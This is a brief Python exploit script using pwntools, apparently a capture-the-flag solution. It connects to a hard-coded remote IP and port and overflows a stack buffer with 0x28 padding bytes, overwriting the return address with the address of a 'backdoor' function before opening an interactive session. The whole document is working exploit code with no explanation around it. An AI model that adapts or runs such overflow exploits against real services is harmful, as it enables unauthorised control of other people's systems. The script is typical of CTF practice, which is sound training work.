from pwn import *

backdoor_addr = 0x4011D9

r = remote('106.54.97.9', 10000)
r.recvuntil(' -> ')
r.sendline(b'\x00' * 0x28 + p64(backdoor_addr))
r.recvline()
r.interactive()
